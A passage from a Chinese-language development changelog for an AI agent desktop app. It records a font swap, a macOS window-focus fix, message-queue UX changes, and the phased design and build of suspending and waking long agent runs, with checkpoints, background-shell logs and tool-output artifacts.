  - 选用 hinted 版本（非 unhinted），macOS / Windows 屏渲染都能用，没有针对 Linux fontconfig 做单独优化

### 2026-05-12 — Maple Mono NF CN 换成 JetBrains Mono（视觉更利落 + 体积 -98%）

- **Why**: 上一条内置 Maple Mono NF CN 后实际跑起来字形效果不如预期（CN 字形偏中文宋体感、NF 图标占宽），用户要求换成 JetBrains 那套编程字体。JetBrains Mono 也是 OFL 1.1、字形对编程优化（连字、零点带斜杠、清晰区分 l1I0O）
- **改动**:
  - [apps/desktop/frontend/src/assets/fonts/](../apps/desktop/frontend/src/assets/fonts/)：
    - 删除 4 个 Maple Mono NF CN woff2（~25 MB）
    - 新增 4 个 JetBrains Mono woff2（Regular/Italic/Bold/BoldItalic，jsdelivr 拉 master `fonts/webfonts/`），总计 ~370 KB
  - [apps/desktop/frontend/src/index.css](../apps/desktop/frontend/src/index.css)：4 个 `@font-face` 把 family 从 `"Maple Mono NF CN"` 换成 `"JetBrains Mono"`，URL 路径同步换
  - [apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx](../apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx)：`ToolPre` dark 分支 className 从 `font-['Maple_Mono_NF_CN',...]` 改成 `font-['JetBrains_Mono',ui-monospace,SFMono-Regular,Menlo,monospace]`
- **影响范围**:
  - 仓库总体积 -24.6 MB（终于不那么膨胀）；JetBrains Mono 只覆盖拉丁字符，中文会 fallback 到系统字体（macOS PingFang SC / Win 微软雅黑），对 terminal 输出无影响
  - `pnpm exec tsc --noEmit` PASS
- **留尾巴**:
  - JetBrains Mono 不含 Nerd Font 图标；如果未来 terminal 输出里有 prompt 风格的 `` /`` 等图标需求，需要再加 Nerd Font 兜底
  - 字体许可仍未单独放在 `assets/fonts/`；和上一条一起补 LICENSE 文本

### 2026-05-12 — 修复 dev 模式重新编译后桌面窗口抢前台焦点

- **Why**: 用户痛点：开着 `pnpm tauri dev` 在别的窗口工作，每次改 Rust 代码触发 cargo 重编 → 进程重启 → 主窗口跳到最前面抢走当前活动应用的焦点，打断工作流
- **改动**:
  - [apps/desktop/tauri.conf.json](apps/desktop/tauri.conf.json): 主窗口加 `"focus": false`，避免 Tauri 创建窗口时把它设为活动窗口
  - [apps/desktop/src/lib.rs](apps/desktop/src/lib.rs) `setup`: macOS + `debug_assertions` 下，进程进入 `setup` 立刻把 `ActivationPolicy` 降到 `Accessory`，绕过 macOS 在 `NSApplicationDidFinishLaunching` 自动把 Regular 应用 activate 到前台的默认行为；起一个 thread 600ms 后再切回 `Regular`，dock 图标恢复正常但此时不再触发 activate；同时在 release 构建里 `set_focus("main")` 保持双击启动应该抢前台的体验
- **影响范围**: 仅 desktop crate；不动协议；不动其他 surface
- **留尾巴**:
  - 仅在 macOS 验证；Windows / Linux 上 dev 重启抢焦点是另一套机制（Windows 是 `SetForegroundWindow`），如有同样痛点需要单独处理
  - 600ms 是经验值——如果 Tauri 窗口创建在某些机器上更慢，可能短暂看到 dock 图标空白；目前没出现就先这样

### 2026-05-12 — 队列重排：默认「等本轮跑完再发」，引导走显式按钮

- **Why**: 用户痛点：streaming 中按 Enter 期望「等本轮跑完再发」（直觉），但旧实现把 Shift+Enter 等同于「仅放队首」，普通 Enter 是 `tail`、Shift+Enter 是 `head`——两种都只是排队，并没有"立即"语义；而队列条只有一个 ↩ 按钮且只对队首启用、文案叫「立即发送」。整体心智混乱：用户分不清"等本轮跑完"还是"立刻插入到当前 model 调用之间"
- **改动**:
  - [docs/架构.md](架构.md) §4.2.3: 新增「两条队列：排队 vs 引导」小节，明确 next_run_queue（surface 端）与 PendingInputs（agent-core 端）的语义边界；记录三按钮 UX；原 §4.2.3 MAX_STEPS 顺移为 §4.2.4
  - [apps/desktop/frontend/src/desktop/ui/store/useStore.ts](apps/desktop/frontend/src/desktop/ui/store/useStore.ts):
    - `flushQueuedHead()` → `flushQueuedItem(id?)`：任意位置可触发引导，不再限队首；失败时还原回原位置（不是固定塞队首）
    - 新增 `returnQueuedToComposer(id)`：移除该项 + 把 content/attachments 写到共享的 `composerDraft`
    - 新增 `composerDraft` + `clearComposerDraft`：ChatInput 消费回填
  - [apps/desktop/frontend/src/desktop/ui/components/InputQueuePanel.tsx](apps/desktop/frontend/src/desktop/ui/components/InputQueuePanel.tsx):
    - 每条三按钮：↩「引导」（任意位置可点，tooltip 改为「引导：当前模型调用完成后立即插队」）、✕「放回输入框」、🗑「删除」
    - 头部标识 `bg-primary/5` 仍保留——它只是"下一个被 drainNext 消费"的视觉提示
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx):
    - Shift+Enter：`enqueue('head')` 之后立即 `flushQueuedItem()`，达成"入队首 + 当前 model_call+tool_call 完成后插队"
    - 订阅 `composerDraft`：用 useEffect 把内容追加（不覆盖）到 textarea + 合并附件，然后 `clearComposerDraft` 并 focus
    - placeholder 文案改为「Enter 排队，Shift+Enter 立即引导」
- **影响范围**: 仅 desktop 前端；agent-core / protocol / CLI 不动；后端 `PendingInputs` 行为完全保持，只是 surface 收窄了写入它的入口
- **留尾巴**:
  - 「放回输入框」是追加模式（避免覆盖用户正在打的字）。极端场景下用户输入框已有大段内容，再放回会拼接出长草稿——这是已知的折中，不是 bug
  - 没有把 ↩ 按钮限制成"仅 streaming 时启用"；非 streaming 时 `flushQueuedItem` 会因 `requestId` 缺失静默 return。考虑后续 disabled 掉

### 2026-05-12 — 设计落地：长任务挂起 + Wakeup（架构.md §4.12，代码分 3 个 Phase）

- **Why**: Bash 长跑命令、定时回看进度、等异步事件等场景，旧路径让模型轮询 `BashOutput` 既费 token 又卡 turn。讨论里用户明确：(1) Bash 超时不 kill、立即返回已有输出；(2) 所有 tool 输出超阈值统一落 artifact 让 agent 分块读；(3) agent_loop 要支持"运行时停止 + checkpointer 唤醒"；(4) cron / bg-finish 用进程内后台线程做，hebbian 退出即丢，重启不自动 resume；(5) wakeup 到 Suspended Run 直接 resume，到 Active Run 走 PendingInputs 插队，消息体用 XML 包裹；(6) UI 不弹挂起提示，右侧浮动栏新加 BackgroundTask 框与 TaskPanel 并列
- **改动**（仅设计，未实现）：
  - [docs/架构.md](架构.md): 新增整节 §4.12「长任务挂起 + Wakeup」，覆盖：
    - 4.12.1 Run 三态（Active / Suspended / Finished）
    - 4.12.2 整体数据流（三后台线程 + mpsc<WakeupEvent>）
    - 4.12.3 RunCheckpoint 落盘（`session_id/run_checkpoint.json`，transcript 不入 checkpoint，靠 jsonl 重建）
    - 4.12.4 两个新工具 WaitForTask / ScheduleWakeup（PascalCase / ReadOnly / 不审批）
    - 4.12.5 Wakeup XML 消息格式（`<wakeup kind="...">…</wakeup>`，作为 user message）
    - 4.12.6 Wakeup 路由（Suspended → resume / Active → PendingInputs 插队 / Finished → 丢）
    - 4.12.7 SEMI 段注入 `<background_tasks>` 块
    - 4.12.8 协议新增事件 RunSuspended / RunResumed
    - 4.12.9 Surface UX（不弹挂起文案；FloatingTaskPanel 旁并列 BackgroundTask 框）
    - 4.12.10 与参考项目对比
    - 4.12.11 Phase 1/2/3 落地顺序
  - 交叉引用：§3.1 加 RunSuspended/RunResumed 事件名；§4.2.1 Run 三态短句；§4.4.6 工具列表加 BashOutput/KillShell/WaitForTask/ScheduleWakeup（17 个）；§9.3 加 `<background_tasks>` / `<wakeup>` 块说明；§13 决策表加 8 行新决策
- **影响范围**: 仅文档；代码未动；不破坏既有 protocol / jsonl
- **留尾巴**:
  - Phase 1（不动 agent_loop）：BackgroundShells 输出双轨落盘 + BashTool 返回 log 路径
  - Phase 2：dispatcher 统一 `materialize_tool_output`，超阈值落 `tool_results/<call_id>.txt`，ToolResult 协议加 `artifact: Option<ToolArtifact>` 字段（向前兼容）
  - Phase 3：agent_loop 状态机化（提取 RunRuntime + RunPhase）+ RunCheckpoint + WakeupScheduler（CronTimer/BgFinishHook/Dispatcher 三后台线程 + mpsc）+ 两个新工具 + 协议新事件 + BackgroundTask 浮动栏 UI + 右侧浮动栏重构（FloatingTaskPanel + BackgroundTaskPanel 竖向并列收进同一容器）

### 2026-05-12 — Phase 1 落地：Bash 后台输出双轨写入（tail buffer + 磁盘 log）

- **Why**: 旧实现 BackgroundShells 只有 256 KiB 内存 tail buffer，长跑命令早期输出会被 evict；BashOutput 也只能拿到 tail 这一份。需要把 stdout/stderr 同时落到磁盘 `~/.hebbian/sessions/<sid>/bg/<task_id>.log`，给 Read 工具按 offset/limit 翻页用——内存 tail 给 BashOutput 增量、磁盘 log 给 Read 完整。架构 §4.12.3 的「双轨」第一步
- **改动**:
  - [crates/agent-core/src/tools/background.rs](crates/agent-core/src/tools/background.rs):
    - `BackgroundShell` 新增 `log_path: Option<PathBuf>` 字段 + 公开 `log_path()` 方法
    - `BackgroundShells::register` 签名加 `log_dir: Option<&Path>` 入参；内部根据 `task_id` join 出 `<log_dir>/<task_id>.log` 用 `OpenOptions::create+append` 打开；打开失败仅 warn 不阻塞命令执行（回落 tail-only）
    - `spawn_reader` 接收 `Option<Arc<AsyncMutex<File>>>`，每行同步写 tail buffer + append 到日志文件，流结束时 flush；stdout/stderr 共享同一 writer Mutex（确保 stderr 前缀和 stdout 行不交错）
    - 新增单测 `writes_log_file_when_log_dir_given`：验证 `<task_id>.log` 含 stdout + `[stderr]` 行
  - [crates/agent-core/src/tools/bash.rs](crates/agent-core/src/tools/bash.rs):
    - `BashTool` 新增 `bg_log_dir: Option<PathBuf>` 字段，`new` 签名增加该参数
    - `execute` 把 `bg_log_dir.as_deref()` 透传给 `shells.register`
    - 转后台 / `run_in_background=true` 的返回文本里追加「完整输出落盘到：<path>」一行（仅当 log 启用时）
  - [crates/agent-core/src/tools/bash_output.rs](crates/agent-core/src/tools/bash_output.rs):
    - 单 task 查询的返回头部加 `[完整日志：<path>]`
    - listing 路径每条尾部追加 ` log=<path>`
  - [crates/agent-core/src/tools/mod.rs](crates/agent-core/src/tools/mod.rs) `default_tools`：签名加 `bg_log_dir: Option<PathBuf>`，只透传给 `BashTool`（BashOutputTool/KillShellTool 不需要，它们从 `BackgroundShell.log_path()` 读）
  - [crates/agent-core/src/storage/sessions_dir.rs](crates/agent-core/src/storage/sessions_dir.rs):
    - 新增 `pub fn bg_dir(data_dir, session_id) -> PathBuf`（与 `tool_results/` / `compactions/` 等并列）
    - `ensure_session_dirs` 把 `bg/` 加进预创建子目录列表
  - [apps/desktop/src/chat.rs](apps/desktop/src/chat.rs) chat 命令构造 harness 时：`bg_log_dir = Some(sessions_dir::bg_dir(data_dir, &args.session_id))`；preview 路径 `build_preview_payload` 传 `None`（预览不发命令）
  - [apps/cli/src/main.rs](apps/cli/src/main.rs) `build_harness_and_client`：先暂传 `None`（CLI 在 harness 构造时还没决定 session_id；Phase 3 把 session_id 提前到 harness 构造之前再补串）
  - [crates/agent-core/src/dispatch.rs](crates/agent-core/src/dispatch.rs) destructive_bash 测试同步补 `None`
- **影响范围**: agent-core/tools（背景 shell 行为加强）+ storage（多一个子目录）+ 两个 surface 的 default_tools 调用点；protocol 不动；jsonl 不动；既有 Bash/BashOutput/KillShell 工具 schema 不动；旧 session 加载时 `bg/` 目录会被 `ensure_session_dirs` 创建出来（空目录无副作用）
- **留尾巴**:
  - CLI 仍是 tail-only（没串 session_id 到 harness 构造）。改起来需要把 `session_id` 提前到 `build_harness_and_client` 之前生成，且 CLI single 模式 / TUI 模式 / json 模式都走同一条；本轮先按 §4.12 设计的"CLI 简化优先"接受，Phase 3 整合时一起串
  - `bg/<task_id>.log` 文件没有自动清理策略；MAX_BACKGROUND_SHELLS = 16 在内存里有上限，但磁盘 log 会随时间累积。Phase 2 加 artifact retention 时再考虑统一清理
  - 单测 `writes_log_file_when_log_dir_given` 在没有 `/dev/stderr` 的极简容器里可能 flaky；目前 macOS / Linux 直跑都过
  - tokio `AsyncMutex` 在 reader spawn task 里锁着串行写——单 reader 单 file 没问题，但 stderr/stdout 两个 reader 抢同一把锁，长跑高吞吐命令理论上会有锁竞争；目前 tail buffer 也是同 Mutex，量级一致，先观察

### 2026-05-12 — Phase 2 落地：大输出统一落 artifact + 头部预览 + 指针

- **Why**: §4.4.9 设计要求所有 tool（不只 Bash）输出超阈值就落 `tool_results/<call_id>.txt` + 给模型「头 2 KB 预览 + 工件路径」，让模型用 Read 自带的 offset/limit 分块读，不重复造工具。旧路径只有 microcompact 对**老**结果做这件事，新结果直接被 `truncate_tool_result` 拦腰截断丢信息
- **改动**:
  - 协议层（`crates/model-gateway/src/types.rs`）：
    - 新增 `pub struct ToolArtifact { path: PathBuf, bytes: u64, line_count: Option<u32> }`
    - `ToolResult` 加 `artifact: Option<ToolArtifact>` 字段——内部结构（不参与 serialize），向前兼容
  - 协议层（`crates/protocol/src/event.rs`）：
    - `EventPayload::ToolCallFinished` 加 `artifact_path: Option<String>`，`#[serde(default, skip_serializing_if = "Option::is_none")]` 老 jsonl 反序列化自动得 None
  - dispatcher（`crates/agent-core/src/dispatch.rs`）：
    - `ToolDispatcher` 新增 `data_dir_for_artifacts: Option<PathBuf>` 字段，`agent_loop` 注入 `data_dir`
    - 新函数 `materialize_tool_output(raw, call_id, sid, data_dir)`：超 `MAX_TOOL_RESULT_INLINE=6 KB` 时调 `storage::tool_results::save_tool_result` 写盘，inline 替换为「头 2 KB 预览 + `[输出 N 字节 / M 行，完整内容已落盘到 path]`」；没 data_dir / 没 sid 时回落原样（再由 `truncate_tool_result` 兜底）；失败路径不触发 materialize（错误文本通常很短，不该升格为工件）
    - `spawn_tool` 把 raw → materialize → truncate；ToolCallFinished 事件携带 `artifact_path`；ToolResult 携带 `artifact` 元数据
    - 单测 3 个：`materialize_above_threshold_writes_artifact_and_pointer` / `materialize_under_threshold_passes_through` / `materialize_without_data_dir_passes_through`
  - 前端（`apps/desktop/src/engine/`）：`EngineEvent::ToolDone` 加 `artifact_path: Option<String>`（mod.rs + types.rs 两处保持同步），chat.rs 翻译时透传
  - 前端（`apps/desktop/frontend/src/desktop/ui/types.ts`）：`EngineEvent.tool_done` 加 `artifact_path?: string | null`；`MessagePart`/`StreamingAssistantPart` 的 `tool_call` 也加（持久层无值，仅 streaming 时有）
  - 前端（`apps/desktop/frontend/src/desktop/ui/store/useStore.ts`）：`applyToolDone` 把 event.artifact_path 写到 streamingPart
  - 前端（`apps/desktop/frontend/src/desktop/ui/components/MessageBubble.tsx`）：新增 `ArtifactBadge` 组件——dashed 边框 + 📎 paperclip 图标 + 单行路径 + 「复制」按钮；在每个 tool 详情下方按 `call.artifactPath` 渲染
  - `normalizeStreamingToolPart` / `normalizeSavedToolPart` 把 `artifact_path` 接到 `ToolCallItem.artifactPath`
- **影响范围**: protocol（新可选字段，向前兼容）/ agent-core（dispatcher 统一闸门）/ model-gateway（types + 各 protocol 模板的 pattern match 加 `..`）/ desktop（engine + frontend 渲染）；jsonl 老对话加载时新字段缺省 None，正常显示，只是没有 ArtifactBadge——这是预期
- **验证**:
  - `cargo test --workspace`：248 passed / 0 failed（含新增 3 个 materialize 单测）
  - `pnpm exec tsc --noEmit`：通过
- **留尾巴**:
  - artifact_path **不持久化**进 jsonl 的 tool_call MessagePart——reload 后徽标不再渲染，但 result 文本里的路径文字仍在，用户能手动复制。如果后续要做"工件历史浏览"，需要 Recorder 落 artifact 元数据
  - 没做 artifact 文件 GC——长跑 session 的 `tool_results/` 会随时间累积。后续可加 retention（按文件 mtime 或 session 关闭时清空非 microcompact 引用的）
  - dispatcher 没做 ArtifactBadge 点击打开本地编辑器——用户需要"复制路径 → 终端打开"。后续可以加 `revealItemInDir(path)` 之类的 Tauri 命令

### 2026-05-13 — Phase 3 落地：agent_loop 挂起 + RunCheckpoint + WakeupScheduler 骨架

- **Why**: 架构 §4.12 设计的最后一步。让模型可以主动"挂起本 Run + 等任务完成 / 定时唤醒"，告别"模型轮询 BashOutput 占 turn"的旧路径。本轮交付**挂起半边**的完整闭环 + **唤醒半边**的进程内调度器骨架；真正"checkpoint → Harness.resume_run → 复活同一个 Run"还差最后一根线，留尾巴
- **改动**:
  - 协议层（`crates/protocol/src/event.rs` / `lib.rs`）：
    - 新增 `EventPayload::RunSuspended { reason, resumes_at_ms?, waiting_for_task_ids }`
    - 新增 `EventPayload::RunResumed { cause }`
    - 新增 `enum SuspendReason { BackgroundTask, Cron, Manual }`
    - 新增 `enum ResumeCause { BgTaskFinished { task_id, exit_code? }, CronFired { original_reason }, UserMessageArrived, ManualResume }`
    - 重新导出 `SuspendReason` / `ResumeCause`
  - 模型层（`crates/model-gateway/src/types.rs` + `instrument.rs` + `providers/mod.rs`）：
    - `ModelError` 加 `Suspended` 变体——agent_loop 用它走 Err 路径 break loop 表示"task 退出但 Run 仍 Active"
    - instrument 与 retry 分支处理 `Suspended`（不算可重试错误、finish_reason = "suspended"）
  - 持久层（`crates/agent-core/src/storage/run_checkpoint.rs`，新文件）：
    - `enum RunPhase { AwaitingBackgroundTask { task_id, max_wait_until_ms? }, AwaitingCron { fire_at_ms, reason } }`
    - `struct RunCheckpoint { run_id, session_id, agent, run_mode, model_id, iteration, model_step_index, tool_step_index, tool_call_dispatch_offset, totals(4), phase, suspended_at_ms }`
    - `save / load / delete` 三个 API；落到 `~/.hebbian/sessions/<sid>/run_checkpoint.json` 原子写
    - transcript **不**入 checkpoint——resume 时从 session.jsonl 重建（§4.12.3）
    - 单测 `save_load_delete_roundtrip` / `cron_phase_roundtrip`
  - 进程级调度器（`crates/agent-core/src/wakeup.rs`，新文件）：
    - `type PhaseChannel = Arc<Mutex<Option<RunPhase>>>`：dispatcher 与 agent_loop 间挂起槽
    - `WakeupScheduler::global()`：OnceLock 单例。三个后台 task：
      - `CronTimer`：每秒扫 cron 表，到点投递 `WakeupEvent::CronFired`
      - `BgFinishHook`：每 500 ms 扫 `BackgroundShells.list()`，发现注册的 task 进入终态时投递 `WakeupEvent::BgTaskFinished`
      - `WakeupDispatcher`：消费 mpsc 事件，调用 `ResumeHandler`（App 注册的回调，目前为空——见留尾巴）
    - `arm_cron / arm_bg_task / set_shells / set_resume_handler / discard_run`
    - `wakeup_xml(event)`：把事件渲染成 `<wakeup kind="..." ...>...</wakeup>` user message 主体
  - 两个新工具（`crates/agent-core/src/tools/wait_for_task.rs` / `schedule_wakeup.rs`，新文件）：
    - `WaitForTask { task_id, max_wait_secs? }`：校验 task_id 存在 → 写 phase channel `AwaitingBackgroundTask` → 返回"已挂起"。`EffectClass::ReadOnly` 不审批
    - `ScheduleWakeup { delay_secs, reason }`：上限 3600s，写 phase channel `AwaitingCron(now+delay)`。同样 ReadOnly
    - `BUILTIN_TOOL_NAMES` + `default_tools` 签名加 `phase: PhaseChannel`；两工具注册进 registry
  - agent_loop 接入挂起（`crates/agent-core/src/agent_loop.rs`）：
    - `LoopParams` / `RunParams` 加 `phase: Option<PhaseChannel>` 字段
    - 每个 ToolStep 完成后，从 phase channel `take()`；非空时：
      1. emit `EventPayload::RunSuspended { reason, resumes_at_ms, waiting_for_task_ids }`
      2. 落 `RunCheckpoint`（data_dir + session_id 齐备时）
      3. 调 `WakeupScheduler::global().arm_cron / arm_bg_task` 注册唤醒
      4. emit `TurnFinished(EndTurn)` 收 turn
      5. `break Err(ModelError::Suspended)` —— agent_loop task 退出但不发 RunFinished
    - 尾段 `match &result` 加 `Err(Suspended)` 分支：仅 record outcome=suspended，不发任何 RunFinished / RunCancelled / RunFailed
  - 桌面 surface 翻译（`apps/desktop/src/engine/mod.rs` + `types.rs`）：
    - `EngineEvent` 加 `RunSuspended { reason, resumes_at_ms?, waiting_for_task_ids }` + `RunResumed { cause }`
    - `agent_event_to_engine_event` 增 protocol → engine 翻译两条
  - 前端（`apps/desktop/frontend/src/desktop/ui/`）：
    - `types.ts` `EngineEvent` 加 `run_suspended` / `run_resumed`
    - `store/useStore.ts` `SessionStream` 加 `suspended: SuspendedInfo | null`；`AppState` 镜像同名字段；`EMPTY_MIRROR` 与 initialSlot 默认 null；`applyEventToSlot` 处理两个事件
    - 新 `components/BackgroundTaskPanel.tsx`：右侧浮动栏，与 `FloatingTaskPanel` 竖向并列（`top-[110px]`）。挂起时显示「等待 bash_001 完成 / 定时 60s 后唤醒」+ 已挂起秒数（每秒滴答），收起为药丸；非挂起态整个不渲染
    - `ChatView.tsx` 引入 `BackgroundTaskPanel` 渲染
  - 调用点更新：CLI / Desktop 的 `default_tools` 都串了 `phase` channel；Session::run_with_pending 暂传 `None`（Session 单独路径目前不接挂起）
  - 各 ToolResult / ToolCallFinished 构造点补 `artifact: None` / `artifact_path: None`（Phase 2 协议扩展的兼容修复，没有功能差异）
  - 架构 §9.3 SEMI 段（`crates/agent-core/src/system_prompt.rs`）：
    - `EnvironmentSnapshot` 加 `background_tasks: Vec<BackgroundTaskSummary>` 字段
    - `BackgroundTaskSummary { task_id, state, command, elapsed_secs }`
    - `with_background_tasks(...)` builder + `render()` 在 `<environment>` 后追加 `<background_tasks>` 块
- **影响范围**: protocol（新事件，向前兼容）/ model-gateway（ModelError 新变体）/ agent-core（新模块 wakeup + run_checkpoint + 两工具 + agent_loop 状态机化）/ desktop（engine + frontend 全量接入）/ CLI（仅串 phase channel，不接 WakeupScheduler）
- **验证**:
  - `cargo test --workspace`：141 + 18 + 7 + 83 + 1 = **250 tests passed / 0 failed**
  - `cargo check --workspace`：通过
  - `pnpm exec tsc --noEmit`：通过
- **留尾巴（重要）**:
  - 🔴 **真正的 resume 还差最后一根线**：WakeupScheduler 已经能 emit `WakeupEvent`、调用 `ResumeHandler`——但默认 handler 没注册，App 层也没注册。要让 Run 真复活，desktop chat.rs 需要：
    - 在 `Harness` 构造后调 `WakeupScheduler::global().set_shells(shells)` 让 BgFinishHook 拿到注册表
    - 注册 `set_resume_handler(Arc::new(|event| { 加载 RunCheckpoint → 加载 session.jsonl 重建 Transcript → push wakeup_xml 作 user message → Harness.spawn_run }))`
    - Harness 需要新方法 `resume_run(session_id, wakeup_user_message, checkpoint) -> RunHandle`，或者 App 持有 spawn_run 所需全部参数的缓存（model client / workspace / agent_def 等），按 session_id 查询后 spawn
  - 目前现象：模型调 WaitForTask / ScheduleWakeup → agent_loop 落 checkpoint + emit RunSuspended + 退出 → 前端 BackgroundTaskPanel 正确显示「挂起态」→ 后台 task 完成 / cron 到点 → WakeupScheduler 触发事件 → handler 未注册，事件 drop → Run 不会复活
  - 现状下用户的兜底：用户主动发新消息 → 后端 chat command 检测到 Suspended（基于 RunCheckpoint 存在）→ 走 resume 路径 inject wakeup user message。这一段也未实现，下一步整一起做
  - 🟡 SEMI `<background_tasks>` 块的结构已就位，但 `Session::append_user` / agent_loop user-message 构建时还没把 `BackgroundShells.list()` 喂给 `EnvironmentSnapshot.with_background_tasks`。补一行调用即可
  - 🟡 BackgroundTaskPanel 没列出**所有**后台 task（只显示当前正在等的 task_id）。要做"列出所有 running bash + pending cron"，需要前端轮询一个新 Tauri 命令 `list_background_tasks(session_id)`——backend 已有 `BackgroundShells.list()`，差一层暴露
  - 🟡 进程重启的体验：retain 在盘上的 `run_checkpoint.json` 不会自动 resume（§13 决策一致）；UI 也没读出它来提示「上次中断」。要做单独加一个 Tauri 命令 + Sidebar 角标
  - WaitForTask v1 只允许一个 task_id；v2 扩成数组——架构 §4.12.4 已约定，留给后续
- **后续 Phase 3.5 路线图（要复活 resume，按此顺序）**:
  1. `Harness::resume_run` 接口（接受 checkpoint + 注入消息 + 复用原 RunParams 模板）
  2. App 层把 session-id → run-params 配置存到一个 `HashMap<sid, ResumableSessionConfig>`
  3. desktop chat.rs 在 chat 命令入口注册 resume handler
  4. session.jsonl 重建 transcript 走 `Session::load_transcript`（已有）
  5. 把 `<wakeup>` user message push 到 transcript 后调 spawn_run
  6. emit `RunResumed { cause }` 让前端 BackgroundTaskPanel 清挂起态
- **关联**: 架构.md §4.12.1～§4.12.11 全部章节

### 2026-05-13 — Phase 3.5 闭环：resume_with + 用户/自动唤醒双路径 + session-scoped 后台栈 + UI 列出全部 bg/cron

- **Why**: Phase 3 落地后还差最后一根线——「真正 resume 复活」。本轮把 6 段缺口全补齐：(1) Session::resume_with 接 agent_loop 的 RunResumeState；(2) RunResumeState::from_checkpoint helper；(3) BackgroundShells 改 session-scoped（修订上一版"进程级单例"的错误决定）；(4) 用户在挂起 session 发新消息自动走 resume 路径；(5) WakeupScheduler.set_resume_handler emit Tauri 事件 → 前端 listener 自动发 wakeup XML；(6) BackgroundTaskPanel 从仅显示挂起态升级为完整列出所有后台 bash + pending cron + 挂起徽标 + 已结束历史
- **改动**:
  - 架构 §4.12.2 修订（`docs/架构.md`）：明确 **BackgroundShells 是 session-scoped**（之前错说"进程级单例"）。调度器仍是进程级单例，但内部 `HashMap<session_id, BackgroundShells>` 路由；不同会话互不可见。§13 决策表新增一行记录这次修订
  - `crates/agent-core/src/tools/background.rs`:
    - 删除上轮加的 `BackgroundShells::global()` 单例（错误方向）
    - 新增进程级 `SESSION_REGISTRY: OnceLock<Mutex<HashMap<String, BackgroundShells>>>` 路由表
    - 公开 `registry_for_session(session_id) -> BackgroundShells`：同 session 多次取同一份；不同 session 隔离
    - `discard_session_registry(session_id)` + `registered_session_ids()` 给 surface 用
  - `crates/agent-core/src/tools/mod.rs`：`default_tools` 加 `shells: BackgroundShells` 参数（由 caller 决定从哪来），不再内部 `BackgroundShells::new()`
  - `crates/agent-core/src/wakeup.rs`：
    - `SchedulerInner.shells_ref` 改成 `session_shells: HashMap<String, BackgroundShells>`
    - `set_shells` → `register_session_shells(session_id, shells)` + `unregister_session_shells(session_id)`
    - `BgFinishHook.scan_bg` 按 `BgWatch.session_id` 反查对应 shells；找不到 shells（session 已销毁）当 done 兜底
    - 新增 `list_pending_crons(session_id)` + `PendingCron` 结构供 UI 展示
    - 新增 `WakeupEvent::session_id()` / `WakeupEvent::run_id()` 访问器
  - `crates/agent-core/src/agent_loop.rs`：`RunResumeState::from_checkpoint(ckpt, cause)` 静态方法，把磁盘 checkpoint 直接转成 resume state（拷 9 个计数字段 + ResumeCause 标签）
  - `crates/agent-core/src/session.rs`：
    - `SessionConfig` + `Session` 加 `phase: Option<PhaseChannel>` 字段；`run_with_pending` 透传 self.phase（之前硬编码 None 是 bug——WaitForTask/ScheduleWakeup 写的 phase channel 与 agent_loop 读的不是同一份）
    - `append_user` 接入 SEMI `<background_tasks>` 注入（架构 §4.12.7）：每条 user message 都查 session 自己的 BackgroundShells，把 Running 状态的 task 渲染为 XML 块；首条用 `<environment>` 内嵌，后续单独前置
  - `crates/agent-core/src/system_prompt.rs`：`prepend_background_tasks(text, &summaries)` 新 helper——非首条 user message 单独前置 `<background_tasks>` 块
  - `apps/desktop/src/chat.rs`：
    - 每次 chat 调用 entry：`registry_for_session(session_id)` 取该 session 的 BackgroundShells（跨调用复用）；同步登记到 WakeupScheduler 让 BgFinishHook 能扫到
    - SessionConfig 加 `phase: Some(phase.clone())`，让 WaitForTask 真能挂起 Run
    - **检测 RunCheckpoint 走 resume 路径**：在 append_user 之后判断 `storage::run_checkpoint::load(...)`，有就 delete + `WakeupScheduler.discard_run` + 用 `core_session.resume_with(...)` 起 Run；否则常规 `run_with_pending`
    - 预览路径继续传本地临时 BackgroundShells（不污染 session_registry）
  - `apps/desktop/src/lib.rs`：
    - Setup 中注册 `WakeupScheduler::global().set_resume_handler(...)`：把 `WakeupEvent` 渲染成 wakeup XML + Tauri-emit 全局 `wakeup-fired` 事件，payload `{ session_id, run_id, wakeup_xml }`
    - 引入 `Emitter` trait
    - 新增 Tauri 命令 `list_background_tasks(session_id) -> SessionBackgroundReport`，返回 `{ shells, pending_crons, has_suspended_checkpoint }`
  - `apps/cli/src/main.rs` + `apps/cli/src/session.rs`：CLI 单跑路径用 `BackgroundShells::new()`（不入 session_registry），`SessionConfig.phase: None`（CLI 不接挂起恢复）。仅为编译通过保留——CLI/TUI 后续会从设计中摘除
  - `apps/desktop/frontend/src/desktop/ui/types.ts`：`BackgroundTaskInfo` / `PendingCron` / `SessionBackgroundReport` 三个类型
  - `apps/desktop/frontend/src/desktop/bridge/tauri.ts`：`api.listBackgroundTasks(sessionId)`
  - `apps/desktop/frontend/src/desktop/ui/store/useStore.ts`：
    - 顶层 `pendingWakeups: Record<sessionId, xml>` 暂存非前台 session 的 wakeup
    - `triggerWakeupResume(sessionId, xml)`：前台 session 直接 sendUserMessage；非前台暂存到 pendingWakeups
    - `queueWakeupForSession(sessionId, xml)` setter
    - `openSession(id)` 顺手消费 `pendingWakeups[id]` —— 切到挂起 session 时自动发出 wakeup XML
  - `apps/desktop/frontend/src/App.tsx`：监听 Tauri `wakeup-fired` 事件 → 调 `triggerWakeupResume`；非前台 toast 提示
  - `apps/desktop/frontend/src/desktop/ui/components/BackgroundTaskPanel.tsx`：从「只在挂起态显示」升级为：3 秒轮询 `listBackgroundTasks`；上方显示挂起徽标（如有）；下方分三段列「运行中」/「定时唤醒」/「已结束」。session-scoped，切 session 自动清状态
- **影响范围**: protocol 无新增 / agent-core wakeup + tools/background + session + system_prompt + agent_loop / desktop chat + lib + 前端全套 / CLI 走 phase=None 通路（不接挂起）
- **验证**:
  - `cargo test --workspace`：**250 tests passed / 0 failed**
  - `cargo check --workspace`：通过
  - `pnpm exec tsc --noEmit`：通过
- **端到端能跑通的场景**:
